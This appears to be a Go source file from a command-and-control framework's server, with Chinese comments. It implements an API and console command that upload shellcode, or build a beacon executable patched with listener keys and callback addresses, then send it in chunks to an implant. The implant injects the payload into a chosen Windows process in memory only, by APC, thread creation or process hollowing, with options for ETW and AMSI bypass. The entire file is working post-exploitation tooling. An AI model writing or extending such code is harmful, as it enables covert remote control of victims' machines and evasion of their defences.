package api

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"

	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
)

// InjectMemRequest 内存注入请求
// 纯内存通道：shellcode 经命令通道分块下发客户端内存缓冲，注入后不落盘。
type InjectMemRequest struct {
	Uid  string `form:"uid"`
	Pid  string `form:"pid"`
	Tech string `form:"tech"`
}

const (
	// injectMemMaxSize 载荷上限。客户端组装完成后有 12MB 的硬上限
	// （core/commands/inject_mem_windows.go 的 len(shellcode) > 12*1024*1024），
	// 原来服务端写 32MB 并注释"与客户端上限一致"，实际会让 12~32MB 的载荷通过服务端校验、
	// 到客户端才被拒 —— 这里对齐到客户端的值，让失败发生在有明确文案的这一侧。
	injectMemMaxSize  = 12 * 1024 * 1024
	injectMemChunk    = 1040500 // 分块大小（与上传通道一致）
	injectMemTechAuto = "auto"
)

// InjectMem 内存注入 API：读取上传的 shellcode blob，分块下发客户端（纯内存，无落盘）。
func InjectMem(c *gin.Context) {
	uid := c.PostForm("uid")
	pidStr := c.PostForm("pid")
	tech := c.PostForm("tech")

	if uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "缺少 uid"})
		return
	}
	pid, err := strconv.Atoi(strings.TrimSpace(pidStr))
	if err != nil || pid <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "pid 必须为正整数"})
		return
	}
	switch tech {
	case "", "auto", "ntc", "apc", "crt":
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "tech 仅支持 auto/ntc/apc/crt"})
		return
	}
	if tech == "" {
		tech = injectMemTechAuto
	}

	// 协作：注入是最"侵入"的动作之一，被他人锁定时直接拒绝
	if !checkSessionLock(c, uid) {
		return
	}

	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "缺少 shellcode 文件: " + err.Error()})
		return
	}
	if file.Size <= 0 || file.Size > injectMemMaxSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("shellcode 大小非法: %d（上限 %d）", file.Size, injectMemMaxSize)})
		return
	}

	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "打开 shellcode 失败"})
		return
	}
	defer f.Close()

	// 读取整个 shellcode 后统一分块下发（SendInjectMem 公共实现，API 与控制台命令共用）
	data, rerr := io.ReadAll(f)
	if rerr != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取 shellcode 失败: " + rerr.Error()})
		return
	}
	sent, seq, err := SendInjectMem(uid, data, pid, tech)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "内存注入下发失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"uid":         uid,
		"pid":         pid,
		"tech":        tech,
		"bytes":       sent,
		"chunks":      seq,
		"memory_only": true,
	}})
}

// SendInjectMem 将 shellcode 分块下发到客户端内存注入缓冲（公共实现）。
// 每包 payload：requestId(4)|total(4)|seq(4)|pidLen(4)|pid|techLen(4)|tech|chunk
// 首包携带 pid/tech；后续包 pidLen/techLen 为 0（与客户端 inject_mem_windows.go 协议一致）。
// 返回 (发送字节数, 分块数, error)。
func SendInjectMem(uid string, data []byte, pid int, tech string) (int64, uint32, error) {
	if len(data) == 0 {
		return 0, 0, fmt.Errorf("shellcode 为空")
	}
	if pid <= 0 {
		return 0, 0, fmt.Errorf("pid 必须为正整数")
	}
	if tech == "" {
		tech = injectMemTechAuto
	}
	requestId := nextRequestId()
	total := uint32((len(data) + injectMemChunk - 1) / injectMemChunk)
	if total == 0 {
		total = 1
	}
	pidBytes := []byte(strconv.Itoa(pid))
	techBytes := []byte(tech)

	u32 := func(v uint32) []byte {
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, v)
		return b
	}
	head := func(seq uint32, pLen int, p []byte, tLen int, t []byte) []byte {
		return utils.BytesCombine(
			u32(requestId), u32(total), u32(seq),
			u32(uint32(pLen)), p, u32(uint32(tLen)), t,
		)
	}

	var seq uint32
	var sent int64
	for len(data) > 0 {
		n := len(data)
		if n > injectMemChunk {
			n = injectMemChunk
		}
		var payload []byte
		if seq == 0 {
			payload = utils.BytesCombine(head(seq, len(pidBytes), pidBytes, len(techBytes), techBytes), data[:n])
		} else {
			payload = utils.BytesCombine(head(seq, 0, nil, 0, nil), data[:n])
		}
		byteToSend := utils.BytesCombine(u32(command.INJECT_MEM), payload)
		// 逐块投递并确认真的发出去了。客户端按 seq 顺序组装（乱序直接报错丢弃），
		// 所以中途任何一块没发出去都必须立刻中止，不能继续往后发。
		if err := sendcommand.SendFileUploadCommandChecked(uid, byteToSend); err != nil {
			return sent, seq, fmt.Errorf("注入分块 %d/%d 下发失败: %w", seq+1, total, err)
		}
		sent += int64(n)
		seq++
		data = data[n:]
	}
	return sent, seq, nil
}

// DispatchInject 控制台命令入口（inject <pid> [tech]）：
// 按该客户端所属监听器的密钥动态生成新 beacon shellcode（经 donut 转换，无文件），
// 走 SendInjectMem 分块下发内存注入——新会话以目标进程身份上线。供 sendcommand 回调。
// 注入载荷强制无口令（反射加载无命令行参数，带 ExecuteKey 会因校验失败退出）。
func DispatchInject(uid string, pid int, tech string) error {
	if err := dispatchInjectInner(uid, pid, tech); err != nil {
		// 失败回写该会话 shell content，控制台可见
		if database.DB() != nil {
			var shell database.Shell
			shell, _, _ = database.Shells().GetByUID(uid)
			shell.ShellContent += "\n[!] inject failed: " + err.Error() + "\n"
			_, _ = database.Shells().UpdateContent(uid, shell.ShellContent)
		}
		logx.Errorf("❌ [INJECT-DISPATCH] %s 注入失败: %v\n", uid, err)
		return err
	}
	return nil
}

func dispatchInjectInner(uid string, pid int, tech string) error {
	listenerType, ok := sendcommand.GetListenerType(uid)
	if !ok {
		return fmt.Errorf("客户端连接类型未知")
	}

	// 监听器密钥/连接地址：优先按客户端实际连接的监听器定位，避免同类型多监听器时取错。
	// （原先按 listen_address 查一个 connect_address 值，地址不同时会静默退回按类型）
	lis, has := listenerForClient(uid, listenerType)
	if !has || lis.ListenAddress == "" {
		return fmt.Errorf("未找到 %s 监听器记录", listenerType)
	}
	connectAddress := resolveClientConnectAddress(lis)

	// 读模板 + patch 完整 beacon PE（Windows/amd64：注入目标是 Windows 进程）。
	// 注入载荷 = 完整 PE（客户端经进程镂空 Process Hollowing 以新进程正常加载，可靠上线），
	// 不再经 donut 转 shellcode（Go 完整 PE 反射加载到远程进程不可靠，会崩溃）。
	binaryFileName := findBinary(listenerType, "windows", "amd64")
	if binaryFileName == "" {
		return fmt.Errorf("未找到 %s windows/amd64 模板", listenerType)
	}
	binaryData, err := readTemplate(listenerType, binaryFileName)
	if err != nil {
		return fmt.Errorf("读取模板失败: %v", err)
	}
	patched, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
		ListenerConfig: listenerType + "://" + connectAddress,
		OS:             "windows",
		Arch:           "amd64",
		VKey:           lis.VKey,
		EncryptSalt:    lis.EncryptionSalt,
		QuietMode:      "1",
		Pass:           "",  // hollow 无命令行参数，禁止口令（ExecuteKey 校验会失败）
		AutoDelete:     "0", // 镂空 beacon 以系统/目标进程路径运行，禁止自我删除宿主文件
		ETWPatch:       "0", // 注入场景保持最小对抗，避免干扰宿主进程
		AmsiBypass:     "0",
	})
	if err != nil {
		return fmt.Errorf("patch 失败: %v", err)
	}
	logx.Infof("💉 [INJECT-DISPATCH] uid=%s pid=%d tech=%s connect=%s pe=%d bytes (Process Hollowing)\n",
		uid, pid, tech, connectAddress, len(patched))

	_, _, err = SendInjectMem(uid, patched, pid, tech)
	return err
}

// resolveClientConnectAddress 解析注入新 beacon 应连接的地址：
// 优先监听器 ConnectAddress（客户端视角可达地址，与前端对话框一致）；
// 为空回退 ListenAddress 并把 0.0.0.0/:: 替换为服务端配置的公网 IP（最后 127.0.0.1 本地兜底）。
func resolveClientConnectAddress(lis database.Listener) string {
	addr := lis.ConnectAddress
	if addr == "" {
		addr = lis.ListenAddress
	}
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		if strings.Contains(addr, ":") {
			return addr
		}
		return addr
	}
	if host != "0.0.0.0" && host != "::" && host != "" {
		return net.JoinHostPort(host, port)
	}
	ext := ""
	if g := config.GetGlobalConfig(); g != nil && g.Server.ExternalIP != "" {
		ext = g.Server.ExternalIP
	} else {
		ext = "127.0.0.1"
	}
	return net.JoinHostPort(ext, port)
}
